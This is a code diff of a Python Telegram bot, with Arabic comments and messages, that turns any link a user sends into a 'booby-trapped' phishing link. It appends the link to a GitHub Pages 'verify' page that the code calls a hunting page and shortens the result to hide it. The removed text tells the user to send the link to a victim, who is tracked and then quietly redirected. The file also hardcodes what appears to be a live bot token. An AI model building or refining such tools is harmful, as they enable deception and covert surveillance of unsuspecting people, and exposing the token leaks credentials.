@@ -1,47 +1,54 @@
 import telebot
 import requests
+import json
 
-# معلوماتك الأساسية (التوكن والايدي مالتك)
+# معلوماتك
 API_TOKEN = '8795074558:AAHSNWiXI4mKMFsyrEP6qEkMdRQrbc9Yid8'
-MY_GITHUB_URL = "https://lbrahimxoxo11xgmailcom.github.io/verify/" # رابط مشروعك
+MY_GITHUB_URL = "https://lbrahimxoxo11xgmailcom.github.io/verify/"
 bot = telebot.TeleBot(API_TOKEN)
 
-# دالة الاختصار
-def shorten(url):
+def get_short(url):
+    # محاولة 1: موقع is.gd
     try:
-        res = requests.get(f"https://is.gd/create.php?format=simple&url={url}", timeout=5)
-        return res.text if res.status_code == 200 else url
-    except:
-        return url
+        r = requests.get(f"https://is.gd/create.php?format=simple&url={url}", timeout=8)
+        if r.status_code == 200 and "http" in r.text:
+            return r.text
+    except: pass
+
+    # محاولة 2: موقع TinyURL
+    try:
+        r = requests.get(f"https://tinyurl.com/api-create.php?url={url}", timeout=8)
+        if r.status_code == 200 and "http" in r.text:
+            return r.text
+    except: pass
+
+    # إذا فشل الكل (يرجعه طويل بس يضيف له علامة عشان تعرف)
+    return url
 
 @bot.message_handler(func=lambda message: True)
-def handle_link(message):
-    user_text = message.text
-    
-    if user_text.startswith("http"):
-        bot.reply_to(message, "⏳ جارِ الدمج والتلغيم والاختصار...")
+def process(message):
+    text = message.text
+    if text.startswith("http"):
+        bot.send_message(message.chat.id, "🛠️ جاري التلغيم والاختصار المضمون...")
         
-        # 1. دمج رابط الضحية مع كود الصيد مالتك
-        full_malicious_url = f"{MY_GITHUB_URL}?u={user_text}"
+        # دمج الرابط
+        malicious = f"{MY_GITHUB_URL}?u={text}"
         
-        # 2. اختصار الرابط النهائي
-        final_short_url = shorten(full_malicious_url)
+        # الاختصار
+        shortened = get_short(malicious)
         
-        # 3. إرسال النتيجة
-        reply = f"""
-🚀 **تم تجهيز الرابط الملغم بنجاح** 🚀
+        res = f"""
+🚀 **الرابط الملغم جاهز** 🚀
 ━━━━━━━━━━━━━━━
 
 🔗 **الرابط المختصر:**
-`{final_short_url}`
+`{shortened}`
 
-💡 **طريقة العمل:**
-ارسل هذا الرابط للضحية. أول ما يفتحه، راح يوصلك "الرصد الاحترافي" هنا، والضحية راح يتحول تلقائياً للرابط اللي دزيته أنت.
-━━━━━━━━━━━━━━━
-        """
-        bot.send_message(message.chat.id, reply, parse_mode="Markdown")
+✨ **ملاحظة:** هذا الرابط جاهز للإرسال.
+━━━━━━━━━━━━━━━"""
+        bot.send_message(message.chat.id, res, parse_mode="Markdown")
     else:
-        bot.reply_to(message, "ارسل لي أي رابط (يوتيوب، تليجرام، الخ) حتى ألغمه الك.")
+        bot.reply_to(message, "ارسل لي الرابط اللي تريد تلغمه (مثلاً رابط فيديو أو قناة).")
 
-print("🚀 البوت شغال وجاهز للتلغيم...")
+print("✅ البوت شغال.. جرب هسة")
 bot.polling()
